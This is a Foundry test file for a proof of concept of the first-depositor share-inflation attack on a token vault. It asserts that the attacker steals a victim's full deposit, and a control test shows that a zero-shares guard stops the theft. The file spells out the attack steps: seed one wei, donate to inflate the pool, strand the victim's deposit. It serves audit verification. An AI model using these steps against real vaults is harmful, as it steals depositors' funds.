// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import {
    Exploit,
    Vault,
    VaultFixed,
    MiniToken,
    Actor
} from "./19124-h-02-first-vault-depositor-can-steal-subsequent-depositors-t.sol";

contract FirstDepositorShareInflationTest is Test {
    address internal constant ATTACKER = 0x1111111111111111111111111111111111111111;

    uint256 internal constant SEED = 1; // 1 wei
    uint256 internal constant DONATION = 10 ether;
    uint256 internal constant ALICE_DEPOSIT = 10 ether;

    function test_exploit_firstDepositorStealsSubsequentDeposit() public {
        Exploit e = new Exploit();
        e.run();

        // The victim was minted 0 shares for a full 10e18 deposit.
        assertEq(e.aliceSharesMinted(), 0, "victim minted 0 shares");
        // ...and can never redeem anything: she loses her entire deposit.
        assertEq(e.aliceLoss(), ALICE_DEPOSIT, "victim loses 100% of her deposit");

        // The attacker drained the entire pool with his single wei-share.
        assertEq(e.attackerWithdrawn(), SEED + DONATION + ALICE_DEPOSIT, "attacker drained the whole pool");
        // Net profit above the attacker's own seed + donation == the victim's deposit.
        assertEq(e.attackerProfit(), ALICE_DEPOSIT, "attacker net-steals the victim's deposit");

        // The stolen underlying physically reaches the attacker EOA.
        MiniToken token = MiniToken(e.tokenAddr());
        assertEq(token.balanceOf(ATTACKER), ALICE_DEPOSIT, "stolen underlying at attacker EOA");
        assertEq(e.attackerEoaStolen(), ALICE_DEPOSIT, "recorded stolen amount matches");
    }

    /// @notice Negative control: with the UniswapV2 fix (require minted shares != 0),
    ///         the victim's deposit REVERTS instead of minting 0 shares, so the
    ///         attacker can never strand her funds — no theft is possible.
    function test_control_fixedVault_victimDepositReverts_noTheft() public {
        MiniToken token = new MiniToken("Underlying", "UND");
        VaultFixed vault = new VaultFixed(address(token));

        Actor alice = new Actor();

        // Fund attacker + victim identically to the exploit scenario.
        token.mint(ATTACKER, SEED + DONATION);
        token.mint(address(alice), ALICE_DEPOSIT);

        // Attacker seeds 1 wei-share, then donates to inflate the pool.
        vm.startPrank(ATTACKER);
        token.approve(address(vault), SEED);
        uint256 attackerShares = vault.deposit(SEED);
        token.transfer(address(vault), DONATION);
        vm.stopPrank();

        // Victim's deposit now rounds shares to 0 -> guard reverts, she keeps her funds.
        alice.approveToken(token, address(vault), ALICE_DEPOSIT);
        vm.expectRevert(bytes("INSUFFICIENT_SHARES_MINTED"));
        alice.depositVault(Vault(address(vault)), ALICE_DEPOSIT);

        // Victim never lost anything: her underlying is intact and she was minted 0 shares.
        assertEq(token.balanceOf(address(alice)), ALICE_DEPOSIT, "victim keeps her full deposit under the fix");
        assertEq(vault.balanceOf(address(alice)), 0, "victim holds no shares");

        // Even if the attacker withdraws his single share, he only gets back his own
        // seed + donation (minus the dust locked to the dead address) — no victim funds.
        vm.prank(ATTACKER);
        uint256 got = vault.withdraw(attackerShares);
        assertLe(got, SEED + DONATION, "attacker cannot extract more than he put in");
        assertEq(token.balanceOf(address(alice)), ALICE_DEPOSIT, "victim funds untouched by the fix");
    }
}
